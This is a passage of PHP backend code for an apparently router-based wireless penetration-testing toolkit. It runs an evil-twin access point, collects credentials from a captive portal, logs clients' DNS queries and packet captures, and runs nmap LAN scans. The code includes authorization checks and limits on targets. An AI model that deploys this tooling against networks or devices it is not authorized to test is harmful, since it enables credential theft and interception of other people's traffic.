        $out = [];
        foreach ($this->portalTemplateDefs() as $id => $def) {
            $out[] = [
                'id' => $id,
                'label' => $def['label'],
                'description' => $def['description'],
                'fields' => $def['fields'],
            ];
        }
        return self::setSuccess(['templates' => $out]);
    }

    public function getPortalCreds()
    {
        $state = $this->readEvilPortalState();
        $creds = $this->readEvilPortalCreds();
        return self::setSuccess([
            'running' => !empty($state['running']) && $this->isEvilPortalRunning(),
            'template' => $state['template'] ?? '',
            'ssid' => $state['ssid'] ?? '',
            'credentials' => $creds,
            'count' => count($creds),
        ]);
    }

    public function clearPortalCreds()
    {
        $path = $this->evilPortalDir() . '/creds.log';
        if (is_file($path)) {
            @file_put_contents($path, '');
        }
        return self::setSuccess(['cleared' => true]);
    }

    // ---- Suite: Rogue AP / KARMA (airbase-ng) ----------------------------------
    // Broadcasts an OPEN evil-twin of an SSID you own via airbase-ng and reports
    // which of your own devices auto-associate (evil-twin exposure test). Scoped to
    // a single operator-supplied SSID; we do NOT use airbase -P (respond-to-all)
    // which would lure un-owned neighbours. Runs on the free 2.4GHz radio (ath9k).

    private function karmaDir()
    {
        return $this->storageRoot() . '/karma';
    }

    private function karmaState()
    {
        $path = $this->karmaDir() . '/state.json';
        $state = json_decode((string)@file_get_contents($path), true);
        return is_array($state) ? $state : ['running' => false];
    }

    private function isKarmaRunning()
    {
        // Karma runs its own hostapd instance (distinct pid file from Evil Portal).
        $pidFile = $this->karmaDir() . '/hostapd.pid';
        if (!is_file($pidFile)) {
            return false;
        }
        $pid = (int)trim((string)@file_get_contents($pidFile));
        return $pid > 0 && file_exists("/proc/{$pid}");
    }

    private function readKarmaLeases()
    {
        // airbase clients get IPs from the box's dnsmasq on the at0 subnet (10.0.1.x).
        $path = is_file('/tmp/dhcp.leases') ? '/tmp/dhcp.leases' : '/var/dhcp.leases';
        $clients = [];
        foreach (explode("\n", (string)@file_get_contents($path)) as $line) {
            $parts = preg_split('/\s+/', trim($line));
            if (count($parts) >= 3 && $this->isSafeBssid(strtolower($parts[1])) && strpos($parts[2], '10.0.1.') === 0) {
                $clients[] = [
                    'mac' => strtolower($parts[1]),
                    'ip' => $parts[2],
                    'hostname' => isset($parts[3]) && $parts[3] !== '*' ? $parts[3] : '',
                ];
            }
        }
        return $clients;
    }

    public function startKarma()
    {
        $ssid = $this->cleanSsid((string)($this->request['ssid'] ?? ''));
        $channel = (int)($this->request['channel'] ?? 6);

        if ($ssid === '' || $ssid === '<hidden>') {
            return self::setError('Enter the SSID to broadcast (a network you own).');
        }
        if (strlen($ssid) > 32) {
            return self::setError('SSID is too long (max 32 characters).');
        }
        if ($channel < 1 || $channel > 13) {
            return self::setError('The KARMA twin must use a 2.4GHz channel (1-13).');
        }
        if (empty($this->request['authorized'])) {
            return self::setError('Confirm you own this SSID and the test devices before broadcasting a twin.');
        }
        foreach (['hostapd', 'dnsmasq'] as $tool) {
            if (trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null')) === '') {
                return self::setError("Required tool '{$tool}' is not installed.");
            }
        }
        if ($this->isEvilPortalRunning() || $this->isKarmaRunning() || $this->isCaptureRunning() || $this->isClientlessRunning()) {
            return self::setError('Another radio job (portal / KARMA / capture) is running. Stop it first.');
        }

        $monitor = $this->resolveMonitorTarget($channel);
        if ($monitor === null) {
            return self::setError('Could not find a 2.4GHz radio for the twin AP.');
        }
        if (!empty($monitor['manageRadio'])) {
            return self::setError('The 2.4GHz radio is in use. Switch to Lab mode to free it before broadcasting.');
        }

        return $this->launchKarma($ssid, $channel, $monitor);
    }

    private function launchKarma($ssid, $channel, $monitor)
    {
        $rt = $this->karmaDir();
        if (!$this->ensureDir($rt)) {
            return self::setError('Unable to create KARMA runtime directory.');
        }
        // Fresh runtime.
        @unlink($rt . '/hostapd.log');
        @unlink($rt . '/setup.err');
        @unlink($rt . '/seen.json');

        $safeSsid = $this->sanitizeSsidForConf($ssid);
        $iface = 'wkarma0';
        $ch = (int)$channel;
        $ePhy = escapeshellarg($monitor['phy']);
        $eIface = escapeshellarg($iface);
        $eErr = escapeshellarg($rt . '/setup.err');
        $ePid = escapeshellarg($rt . '/hostapd.pid');
        $eConf = escapeshellarg($rt . '/hostapd.conf');
        $eLog = escapeshellarg($rt . '/hostapd.log');

        // Open evil-twin AP via hostapd — far more reliable than airbase on this
        // hardware (airbase hit "channel -1" errors) and, crucially, associated
        // clients show up in `iw dev wkarma0 station dump`, so exposure detection is
        // definitive instead of scraping stdout.
        $conf = "interface={$iface}\ndriver=nl80211\nssid={$safeSsid}\nhw_mode=g\nchannel={$ch}\nauth_algs=1\nignore_broadcast_ssid=0\nwmm_enabled=1\n";
        @file_put_contents($rt . '/hostapd.conf', $conf);

        // DHCP for the twin subnet via the box's dnsmasq conf-dir (like Evil Portal),
        // so a device that joins actually gets an IP and the association sticks.
        $confDir = trim((string)shell_exec("grep -h '^conf-dir=' /var/etc/dnsmasq.conf.* 2>/dev/null | head -1 | sed 's/^conf-dir=//; s/,.*//'"));
        $fragment = '';
        if ($confDir !== '' && is_dir($confDir)) {
            $fragment = $confDir . '/wa-karma.conf';
            @file_put_contents($fragment, "dhcp-range=10.0.1.50,10.0.1.150,255.255.255.0,12h\ndhcp-option=3,10.0.1.1\ndhcp-option=6,10.0.1.1\n");
        }

        $script =
            'iw dev ' . $eIface . ' del 2>/dev/null; ' .
            'if ! iw phy ' . $ePhy . ' interface add ' . $eIface . ' type __ap 2>> ' . $eErr . '; then ' .
            'echo "[wa] failed to create AP iface ' . $iface . '" >> ' . $eErr . '; exit 1; fi; ' .
            'ip addr flush dev ' . $eIface . ' 2>/dev/null; ' .
            'ip addr add 10.0.1.1/24 dev ' . $eIface . ' 2>> ' . $eErr . '; ' .
            'ip link set ' . $eIface . ' up 2>> ' . $eErr . '; ' .
            'hostapd -B -P ' . $ePid . ' ' . $eConf . ' >> ' . $eLog . ' 2>&1; ' .
            '/etc/init.d/dnsmasq restart >/dev/null 2>&1; ';

        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $script . ' ) >/dev/null 2>&1'));

        usleep(1200000);
        if (!$this->isKarmaRunning()) {
            $err = trim((string)@file_get_contents($rt . '/hostapd.log')) . "\n" . trim((string)@file_get_contents($rt . '/setup.err'));
            $this->teardownKarma();
            return self::setError('Twin AP (hostapd) failed to start. ' . trim($err));
        }

        $state = [
            'running' => true,
            'ssid' => $safeSsid,
            'channel' => $ch,
            'phy' => $monitor['phy'],
            'radio' => $monitor['radio'],
            'iface' => $iface,
            'apIp' => '10.0.1.1',
            'fragment' => $fragment,
            'startedAt' => gmdate('c'),
        ];
        @file_put_contents($rt . '/state.json', json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        return self::setSuccess(['running' => true, 'state' => $state]);
    }

    private function teardownKarma()
    {
        $rt = $this->karmaDir();
        $state = $this->karmaState();

        if (is_file($rt . '/hostapd.pid')) {
            $pid = (int)trim((string)@file_get_contents($rt . '/hostapd.pid'));
            if ($pid > 0) {
                shell_exec('kill ' . (int)$pid . ' 2>/dev/null; sleep 1; kill -9 ' . (int)$pid . ' 2>/dev/null');
            }
        }
        @unlink($rt . '/hostapd.pid');
        $iface = isset($state['iface']) && preg_match('/^[a-z0-9]+$/', (string)$state['iface']) ? $state['iface'] : 'wkarma0';
        shell_exec('iw dev ' . escapeshellarg($iface) . ' del 2>/dev/null');

        $fragment = (string)($state['fragment'] ?? '');
        if ($fragment !== '' && is_file($fragment)) {
            @unlink($fragment);
            shell_exec('/etc/init.d/dnsmasq restart >/dev/null 2>&1');
        }

        @file_put_contents($rt . '/state.json', json_encode(['running' => false], JSON_PRETTY_PRINT));
    }

    public function karmaStatus()
    {
        $state = $this->karmaState();
        if (empty($state['running'])) {
            return self::setSuccess(['running' => false, 'state' => $state]);
        }

        $alive = $this->isKarmaRunning();
        $iface = isset($state['iface']) && preg_match('/^[a-z0-9]+$/', (string)$state['iface']) ? $state['iface'] : 'wkarma0';

        // Definitive detection: hostapd exposes associated stations. `iw station dump`
        // lists every device currently associated to the twin (MAC + signal).
        $current = [];
        $dump = (string)shell_exec('iw dev ' . escapeshellarg($iface) . ' station dump 2>/dev/null');
        $curMac = '';
        foreach (explode("\n", $dump) as $line) {
            if (preg_match('/^Station\s+([0-9a-fA-F:]{17})/', trim($line), $m)) {
                $curMac = strtolower($m[1]);
                $current[$curMac] = ['mac' => $curMac, 'signal' => ''];
            } elseif ($curMac !== '' && preg_match('/signal:\s*(-?\d+)/', $line, $sm)) {
                $current[$curMac]['signal'] = $sm[1] . ' dBm';
            }
        }

        // Cumulative "seen" list persisted across polls — a device that auto-joins
        // then drops off (open networks with no internet) is still evidence of
        // exposure, so we remember it for the life of the run.
        $seenPath = $this->karmaDir() . '/seen.json';
        $seen = json_decode((string)@file_get_contents($seenPath), true);
        $seen = is_array($seen) ? $seen : [];
        foreach (array_keys($current) as $mac) {
            $seen[$mac] = gmdate('c');
        }
        foreach ($this->readKarmaLeases() as $lease) {
            $seen[$lease['mac']] = gmdate('c');
        }
        @file_put_contents($seenPath, json_encode($seen, JSON_UNESCAPED_SLASHES));

        // Build the "joined" list from cumulative seen MACs, enriched with the live
        // signal (if still associated) and any DHCP lease (IP/hostname).
        $leaseByMac = [];
        foreach ($this->readKarmaLeases() as $lease) {
            $leaseByMac[$lease['mac']] = $lease;
        }
        $joined = [];
        foreach (array_keys($seen) as $mac) {
            $row = ['mac' => $mac];
            if (isset($current[$mac]['signal']) && $current[$mac]['signal'] !== '') {
                $row['signal'] = $current[$mac]['signal'];
            }
            $row['connected'] = isset($current[$mac]);
            if (isset($leaseByMac[$mac])) {
                $row['ip'] = $leaseByMac[$mac]['ip'];
                $row['hostname'] = $leaseByMac[$mac]['hostname'];
            }
            $joined[] = $row;
        }
        $joined = $this->attachVendors($joined, 'mac');

        return self::setSuccess([
            'running' => $alive,
            'state' => $state,
            'associated' => $joined,
            'associatedCount' => count($joined),
            'currentCount' => count($current),
            'exposed' => count($joined) > 0,
        ]);
    }

    public function stopKarma()
    {
        $this->teardownKarma();
        return self::setSuccess(['running' => false, 'stopped' => true]);
    }

    // Traffic intelligence for the internet-passthrough twin: per-client DNS activity
    // parsed from dnsmasq's query log plus the size of the rolling transit pcap. Only
    // meaningful while an internet-mode twin is live; captive mode has no upstream.
    public function evilPortalTraffic()
    {
        $state = $this->readEvilPortalState();
        if (empty($state['running']) || empty($state['internet'])) {
            return self::setSuccess([
                'internet' => !empty($state['internet']),
                'running' => !empty($state['running']),
                'clients' => [],
                'note' => 'Traffic intelligence is only collected while an internet-passthrough twin is running.',
            ]);
        }

        $rt = $this->evilPortalDir();
        $dnsLog = (string)($state['dnsLog'] ?? ($rt . '/dns.log'));
        $byClient = [];

        if (is_file($dnsLog)) {
            // Tail the log so a long-running twin doesn't blow memory. Each dnsmasq
            // "query[TYPE] domain from 10.0.0.x" line tells us who asked for what.
            $tail = (string)shell_exec('tail -n 4000 ' . escapeshellarg($dnsLog) . ' 2>/dev/null');
            foreach (explode("\n", $tail) as $line) {
                if (!preg_match('/query\[[^\]]+\]\s+(\S+)\s+from\s+(10\.0\.0\.\d+)/', $line, $m)) {
                    continue;
                }
                $domain = strtolower($m[1]);
                $ip = $m[2];
                if (!isset($byClient[$ip])) {
                    $byClient[$ip] = ['ip' => $ip, 'queries' => 0, 'domains' => []];
                }
                $byClient[$ip]['queries']++;
                if (!isset($byClient[$ip]['domains'][$domain])) {
                    $byClient[$ip]['domains'][$domain] = 0;
                }
                $byClient[$ip]['domains'][$domain]++;
            }
        }

        // Attach lease hostnames + vendor so the traffic view lines up with the client list.
        $leases = [];
        foreach ($this->readEvilPortalLeases() as $lease) {
            $leases[$lease['ip']] = $lease;
        }

        $clients = [];
        foreach ($byClient as $ip => $data) {
            arsort($data['domains']);
            $top = [];
            foreach (array_slice($data['domains'], 0, 25, true) as $domain => $count) {
                $top[] = ['domain' => $domain, 'count' => $count];
            }
            $lease = $leases[$ip] ?? [];
            $clients[] = [
                'ip' => $ip,
                'mac' => $lease['mac'] ?? '',
                'hostname' => $lease['hostname'] ?? '',
                'vendor' => $lease['vendor'] ?? '',
                'queryCount' => $data['queries'],
                'uniqueDomains' => count($data['domains']),
                'topDomains' => $top,
            ];
        }
        // Busiest clients first.
        usort($clients, function ($a, $b) {
            return $b['queryCount'] - $a['queryCount'];
        });

        // Rolling pcap: sum every rotation file tcpdump left behind.
        $pcapBytes = 0;
        $pcapBase = (string)($state['pcap'] ?? ($rt . '/cap.pcap'));
        foreach (glob($pcapBase . '*') ?: [] as $f) {
            $pcapBytes += (int)@filesize($f);
        }

        return self::setSuccess([
            'internet' => true,
            'running' => true,
            'uplinkDev' => $state['uplinkDev'] ?? '',
            'clients' => $clients,
            'clientCount' => count($clients),
            'pcapBytes' => $pcapBytes,
        ]);
    }

    public function getRadioMode()
    {
        return self::setSuccess($this->readRadioMode());
    }

    public function setRadioMode()
    {
        $mode = strtolower(trim((string)($this->request['mode'] ?? '')));
        if (!in_array($mode, ['uplink', 'lab'], true)) {
            return self::setError('Mode must be "uplink" or "lab".');
        }
        // Refuse to reconfigure radios out from under a live twin AP.
        if ($this->isEvilPortalRunning()) {
            return self::setError('Stop the Evil Portal before switching radio mode.');
        }

        // radio0 = 5GHz STA uplink to the configured uplink SSID (wifinet0). radio1 = 2.4GHz, kept
        // disabled at netifd level but usable directly for monitor/AP work.
        if ($mode === 'uplink') {
            $cmds = [
                "uci set wireless.radio0.disabled='0'",
                "uci set wireless.wifinet0.disabled='0'",
                "uci set wireless.radio1.disabled='1'",
            ];
        } else { // lab: no uplink, both radios free for testing
            $cmds = [
                "uci set wireless.wifinet0.disabled='1'",
                "uci set wireless.radio0.disabled='1'",
                "uci set wireless.radio1.disabled='1'",
            ];
        }
        foreach ($cmds as $cmd) {
            shell_exec($cmd . ' 2>/dev/null');
        }
        shell_exec('uci commit wireless 2>/dev/null');
        // Apply. wifi reload reconfigures netifd wireless without a full radio bounce.
        shell_exec('/sbin/wifi reload >/dev/null 2>&1');
        // Give netifd/DHCP a moment to settle before we read state back.
        sleep(3);

        $state = $this->readRadioMode();
        $state['applied'] = $mode;
        return self::setSuccess($state);
    }

    private function readRadioMode()
    {
        $get = function ($key) {
            return trim((string)shell_exec('uci -q get ' . escapeshellarg($key) . ' 2>/dev/null'));
        };
        $radio0Disabled = $get('wireless.radio0.disabled') === '1';
        $radio1Disabled = $get('wireless.radio1.disabled') === '1';
        $staDisabled = $get('wireless.wifinet0.disabled') === '1';
        $uplinkSsid = $get('wireless.wifinet0.ssid');

        if (!$radio0Disabled && !$staDisabled) {
            $mode = 'uplink';
        } elseif ($radio0Disabled && $staDisabled) {
            $mode = 'lab';
        } else {
            $mode = 'custom';
        }

        // Live uplink association: a managed (client) iface reporting an SSID means
        // the STA is actually joined to the upstream AP.
        $connected = false;
        foreach ($this->getWirelessInterfaces() as $iface) {
            if (($iface['type'] ?? '') === 'managed' && !empty($iface['ssid'])) {
                $connected = true;
                break;
            }
        }

        return [
            'mode' => $mode,
            'uplinkSsid' => $uplinkSsid,
            'internet' => $mode === 'uplink' && $connected,
            'radios' => [
                'radio0' => ['band' => '5g', 'free' => $radio0Disabled, 'role' => $radio0Disabled ? 'free for testing' : 'STA uplink'],
                'radio1' => ['band' => '2g', 'free' => true, 'role' => 'free for testing'],
            ],
        ];
    }

    // ------------------------------------------------------------------
    // LAN recon (nmap). Scans a private network you are attached to (your
    // uplink LAN or the Evil Portal twin's client subnet) for live hosts,
    // open ports, and services. Restricted to RFC1918 ranges you are on.
    // ------------------------------------------------------------------

    public function startLanScan()
    {
        $profile = (string)($this->request['profile'] ?? 'discovery');
        if (!in_array($profile, ['discovery', 'ports', 'services'], true)) {
            return self::setError('Unknown scan profile.');
        }
        if (trim((string)shell_exec('command -v nmap 2>/dev/null')) === '') {
            return self::setError("Required tool 'nmap' is not installed.");
        }
        if ($this->isLanScanRunning()) {
            return self::setError('A network scan is already running. Stop it first.');
        }

        $resolved = $this->resolveLanTarget((string)($this->request['target'] ?? 'uplink'), $profile);
        if (isset($resolved['error'])) {
            return self::setError($resolved['error']);
        }
        if (!$this->ensureDir($this->lanJobDir())) {
            return self::setError('Unable to create scan job storage.');
        }

        $jobId = 'lan-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->lanJobPaths($jobId);
        $meta = [
            'jobId' => $jobId,
            'profile' => $profile,
            'target' => $resolved['cidr'],
            'label' => $resolved['label'],
            'createdAt' => gmdate('c'),
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $nmap = trim((string)shell_exec('command -v nmap 2>/dev/null')) ?: 'nmap';
        $args = $this->nmapProfileArgs($profile);
        $eCidr = escapeshellarg($resolved['cidr']);
        $eOut = escapeshellarg($paths['out']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);
        $ePid = escapeshellarg($paths['pid']);
        $eStop = escapeshellarg($paths['stop']);

        // Run nmap in the background; a watcher kills it if a stop flag appears.
        $body = escapeshellarg($nmap) . ' ' . $args . ' ' . $eCidr . ' >> ' . $eOut . ' 2>> ' . $eErr . ' & NPID=$!; '
            . 'echo $NPID > ' . $ePid . '; '
            . 'while kill -0 $NPID 2>/dev/null; do if [ -f ' . $eStop . ' ]; then kill $NPID 2>/dev/null; sleep 1; kill -9 $NPID 2>/dev/null; break; fi; sleep 1; done; '
            . 'wait $NPID 2>/dev/null; echo 0 > ' . $eDone . ';';
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $body . ' ) >/dev/null 2>&1 &'));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    public function lanScanStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid scan job.');
        }
        $paths = $this->lanJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Scan job was not found.');
        }
        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);
        $output = (string)@file_get_contents($paths['out']);
        $hosts = $this->parseNmap($output);

        $response = self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'hosts' => $hosts,
            'hostCount' => count($hosts),
            'log' => $this->tailFile($paths['out'], 6000),
            'error' => trim($this->tailFile($paths['err'], 2000)),
        ]);

        // Ephemeral: clean the job files once results are read.
        if (!$pending) {
            foreach ($paths as $path) {
                if (is_string($path) && is_file($path)) {
                    @unlink($path);
                }
            }
        }
        return $response;
    }

    public function stopLanScan()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid scan job.');
        }
        $paths = $this->lanJobPaths($jobId);
        if (is_file($paths['meta'])) {
            @file_put_contents($paths['stop'], gmdate('c'));
        }
        return self::setSuccess(['stopping' => true, 'jobId' => $jobId]);
    }

    private function lanJobDir()
    {
        return $this->storageRoot() . '/lan';
    }

    private function lanJobPaths($jobId)
    {
        $base = $this->lanJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'out' => $base . '.out',
            'err' => $base . '.err',
            'done' => $base . '.done',
            'pid' => $base . '.pid',
            'stop' => $base . '.stop',
        ];
    }

    private function isLanScanRunning()
    {
        return trim((string)shell_exec('/usr/bin/pgrep -x nmap 2>/dev/null')) !== '';
    }

    private function nmapProfileArgs($profile)
    {
        switch ($profile) {
            case 'ports':
                return '-n -Pn --top-ports 100 -T4 --max-retries 1 --host-timeout 60s';
            case 'services':
                return '-n -Pn --top-ports 50 -sV --version-light -T4 --max-retries 1 --host-timeout 90s';
            case 'discovery':
            default:
                return '-sn -n -T4';
        }
    }

    private function isPrivateIpv4($ip)
    {
        // Plain octet math (no large hex literals / bitwise) so this is safe on the
        // router's 32-bit PHP build where 0xFFFFFFFF is a float.
        $o = explode('.', $ip);
        if (count($o) !== 4) {
            return false;
        }
        $a = (int)$o[0];
        $b = (int)$o[1];
        return ($a === 10)                        // 10.0.0.0/8
            || ($a === 172 && $b >= 16 && $b <= 31) // 172.16.0.0/12
            || ($a === 192 && $b === 168);          // 192.168.0.0/16
    }

    // Turn a target request into a validated CIDR. Accepts the keywords "uplink"
    // (your internet LAN) and "twin" (the Evil Portal client subnet), a single
    // private IP, or a private CIDR. Enforces RFC1918 + a host-count cap so a scan
    // can't run away on this single-core box.
    private function resolveLanTarget($target, $profile)
    {
        $target = trim($target);
        $cidr = '';
        $label = '';

        if ($target === 'twin') {
            if (!$this->isEvilPortalRunning()) {
                return ['error' => 'The Evil Portal twin is not running, so there is no client subnet to scan.'];
            }
            $cidr = '10.0.0.0/24';
            $label = 'Evil Portal twin clients';
        } elseif ($target === 'uplink' || $target === '') {
            $route = (string)shell_exec("ip -o route get 1.1.1.1 2>/dev/null");
            if (!preg_match('/dev\s+(\S+)/', $route, $dm) || !preg_match('/src\s+(\d+\.\d+\.\d+\.\d+)/', $route, $sm)) {
                return ['error' => 'No internet uplink is available to derive a LAN from. Switch to Internet (uplink) mode first.'];
            }
            $dev = $dm[1];
            $src = $sm[1];
            $addr = (string)shell_exec('ip -o -f inet addr show dev ' . escapeshellarg($dev) . ' 2>/dev/null');
            $prefix = preg_match('/inet\s+\d+\.\d+\.\d+\.\d+\/(\d+)/', $addr, $pm) ? (int)$pm[1] : 24;
            if ($prefix < 22) {
                $prefix = 24; // don't derive an enormous range from an odd netmask
            }
            $cidr = $src . '/' . $prefix;
            $label = 'Uplink LAN (' . $dev . ')';
        } elseif (preg_match('#^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:/(\d{1,2}))?$#', $target, $m)) {
            $ip = $m[1];
            $prefix = isset($m[2]) ? (int)$m[2] : 32;
            // Validate octets manually (the filter extension may be absent on this build).
            $octetsOk = true;
            foreach (explode('.', $ip) as $octet) {
                if ((int)$octet > 255) {
                    $octetsOk = false;
                    break;
                }
            }
            if (!$octetsOk || $prefix > 32) {
                return ['error' => 'Invalid target address.'];
            }
            if (!$this->isPrivateIpv4($ip)) {
                return ['error' => 'Only private (RFC1918) networks you are attached to can be scanned.'];
            }
            $cidr = $ip . '/' . $prefix;
            $label = 'Custom target ' . $cidr;
        } else {
            return ['error' => 'Target must be "uplink", "twin", a private IP, or a private CIDR.'];
        }

        // Host-count cap: discovery is cheap (ARP), port/service scans are not.
        $prefix = (int)substr($cidr, strpos($cidr, '/') + 1);
        $hosts = pow(2, max(0, 32 - $prefix));
        $cap = ($profile === 'discovery') ? 1024 : 64;
        if ($hosts > $cap) {
            return ['error' => 'That range is too large for a ' . $profile . ' scan (max ' . $cap . ' addresses). Narrow the CIDR or scan a single host.'];
        }
        return ['cidr' => $cidr, 'label' => $label];
    }

    private function parseNmap($output)
    {
        $hosts = [];
        $blocks = preg_split('/\n(?=Nmap scan report for )/', (string)$output);
        foreach ($blocks as $block) {
            if (strpos($block, 'Nmap scan report for ') === false) {
                continue;
            }
            $host = ['ip' => '', 'hostname' => '', 'mac' => '', 'vendor' => '', 'up' => false, 'ports' => []];
            if (preg_match('/Nmap scan report for (.+)/', $block, $m)) {
                $line = trim($m[1]);
                if (preg_match('/^(.+?)\s+\((\d+\.\d+\.\d+\.\d+)\)$/', $line, $hm)) {
                    $host['hostname'] = $hm[1];
                    $host['ip'] = $hm[2];
                } else {
                    $host['ip'] = $line;
                }
            }
            $host['up'] = (strpos($block, 'Host is up') !== false);
            if (preg_match('/MAC Address:\s*([0-9A-Fa-f:]{17})\s*(?:\(([^)]*)\))?/', $block, $mm)) {
                $host['mac'] = strtolower($mm[1]);
                $vendor = isset($mm[2]) ? trim($mm[2]) : '';
                $host['vendor'] = (strcasecmp($vendor, 'Unknown') === 0) ? '' : $vendor;
            }
            foreach (explode("\n", $block) as $l) {
                if (preg_match('/^(\d+)\/(tcp|udp)\s+(\S+)\s+(\S+)(?:\s+(.*))?$/', trim($l), $pm)) {
                    $host['ports'][] = [
                        'port' => (int)$pm[1],
                        'proto' => $pm[2],
                        'state' => $pm[3],
                        'service' => $pm[4],
                        'version' => isset($pm[5]) ? trim($pm[5]) : '',
                    ];
                }
            }
            if ($host['ip'] !== '' && ($host['up'] || !empty($host['ports']))) {
                $hosts[] = $host;
            }
        }
        // Fill vendor from our OUI DB where nmap didn't provide one.
        return $this->attachVendorsFallback($hosts);
    }

    // Like attachVendors but keeps any vendor nmap already resolved.
    private function attachVendorsFallback($hosts)
    {
        if (empty($hosts)) {
            return $hosts;
        }
        $macs = [];
        foreach ($hosts as $h) {
            if (!empty($h['mac']) && empty($h['vendor'])) {
                $macs[] = $h['mac'];
            }
        }
        if (empty($macs)) {
            return $hosts;
        }
        $map = $this->ouiVendorMap($macs);
        foreach ($hosts as &$h) {
            if (!empty($h['mac']) && empty($h['vendor'])) {
                $h['vendor'] = $map[$this->macOui($h['mac'])] ?? '';
            }
        }
        unset($h);
        return $hosts;
    }

    private function getSystemInfo()
    {
        return [
            'hostname' => trim(@file_get_contents('/proc/sys/kernel/hostname')),
            'model' => trim(@file_get_contents('/tmp/sysinfo/model')),
            'board' => trim(@file_get_contents('/tmp/sysinfo/board_name')),
            'release' => $this->readOpenWrtRelease(),
        ];
    }

    private function readOpenWrtRelease()
    {
        $release = [];
        $lines = @file('/etc/openwrt_release', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!is_array($lines)) {
            return $release;
        }
        foreach ($lines as $line) {
            if (strpos($line, '=') === false) {
                continue;
            }
            [$key, $value] = explode('=', $line, 2);
            $release[$key] = trim($value, "'");
        }
        return $release;
    }

    private function getStorageInfo()
    {
        $rows = [];
        $output = shell_exec('/bin/df -h 2>/dev/null');
        foreach (explode("\n", trim((string)$output)) as $index => $line) {
            if ($index === 0 || trim($line) === '') {
                continue;
            }
            $parts = preg_split('/\s+/', trim($line));
            if (count($parts) >= 6) {
                $rows[] = [
                    'filesystem' => $parts[0],
                    'size' => $parts[1],
                    'used' => $parts[2],
                    'available' => $parts[3],
                    'usePercent' => $parts[4],
                    'mountedOn' => $parts[5],
                ];
            }
        }
        return $rows;
    }

    private function getToolStatus()
    {
        $tools = [];
        foreach (array_merge($this->coreTools, $this->optionalTools) as $tool) {
            $path = trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null'));
            $tools[] = [
                'name' => $tool,
                'installed' => $path !== '',
                'path' => $path,
                'requiredFor' => $this->toolPurpose($tool),
            ];
        }
        return $tools;
    }

    private function toolPurpose($tool)
    {
        $purposes = [
            'iw' => 'radio and AP scanning',
            'iwinfo' => 'OpenWrt wireless status',
            'wifi' => 'OpenWrt wireless control/status',
            'ubus' => 'OpenWrt runtime data',
            'uci' => 'configuration reads',
            'hcxdumptool' => 'unused — active injection crashed this hardware, retired from all attack paths',
            'nmap' => 'LAN/client service checks',
            'curl' => 'module integrations',
            'tcpdump' => 'packet capture workflows',
            'aircrack-ng' => 'handshake verification/cracking workflow',
            'airodump-ng' => 'monitor-mode capture engine (PMKID/handshake)',
            'aireplay-ng' => 'authorized deauth to force handshakes',
            'reaver' => 'WPS assessment',
            'wash' => 'WPS discovery',
            'bully' => 'alternate WPS assessment',
            'hcxpcapngtool' => 'capture -> hashcat 22000 conversion',
            'hcxhashtool' => 'hash utility workflows',
            'sqlite3' => 'CLI database inspection',
            'hostapd' => 'Evil Portal twin AP',
            'dnsmasq' => 'Evil Portal DHCP for twin subnet',
            'nft' => 'Evil Portal captive-portal redirect',
            'uhttpd' => 'Evil Portal captive-portal web server',
        ];
        return $purposes[$tool] ?? '';
    }

    private function getPackageStatus()
    {
        $wanted = ['aircrack-ng', 'hcxtools', 'reaver', 'tcpdump', 'tcpdump-mini', 'sqlite3-cli', 'git', 'php8-cli'];
        $installedRaw = (string)shell_exec('/bin/opkg list-installed 2>/dev/null');
        $packages = [];
        foreach ($wanted as $pkg) {
            $packages[] = [
                'name' => $pkg,
                'installed' => strpos($installedRaw, $pkg . ' -') !== false,
                'available' => true,
            ];
        }
        return $packages;
    }

    private function getRadios()
    {
        $radios = [];
        $paths = glob('/sys/class/ieee80211/phy*');
        if (!is_array($paths)) {
            return $radios;
        }
        $phyText = (string)shell_exec('/usr/sbin/iw phy 2>/dev/null');
        foreach ($paths as $path) {
            $name = basename($path);
            $chunk = $this->extractPhyChunk($phyText, $name);
            $radios[] = [
                'name' => $name,
                'bands' => $this->detectBands($chunk),
                'modes' => $this->detectModes($chunk),
                'path' => @readlink($path) ?: '',
            ];
        }
        return $radios;
    }

    private function extractPhyChunk($text, $phy)
    {
        if (!preg_match('/Wiphy\s+' . preg_quote($phy, '/') . '\b(.*?)(?=\nWiphy\s+phy|\z)/s', $text, $match)) {
            return '';
        }
        return $match[1];
    }

    private function detectBands($chunk)
    {
        $bands = [];
        if (strpos($chunk, '2412.0 MHz') !== false) {
            $bands[] = '2.4 GHz';
        }
        if (strpos($chunk, '5180.0 MHz') !== false || strpos($chunk, '5745.0 MHz') !== false) {
            $bands[] = '5 GHz';
        }
        return $bands;
    }

    private function detectModes($chunk)
    {
        $modes = [];
        foreach (['managed', 'AP', 'monitor', 'mesh point'] as $mode) {
            if (preg_match('/\*\s+' . preg_quote($mode, '/') . '\b/', $chunk)) {
                $modes[] = $mode;
            }
        }
        return $modes;
    }

    private function getWirelessInterfaces()
    {
        $interfaces = [];
        $output = (string)shell_exec('/usr/sbin/iw dev 2>/dev/null');
        $currentPhy = '';
        $current = null;
        foreach (explode("\n", $output) as $line) {
            if (preg_match('/^phy#(\d+)/', trim($line), $match)) {
                $currentPhy = 'phy' . $match[1];
                continue;
            }
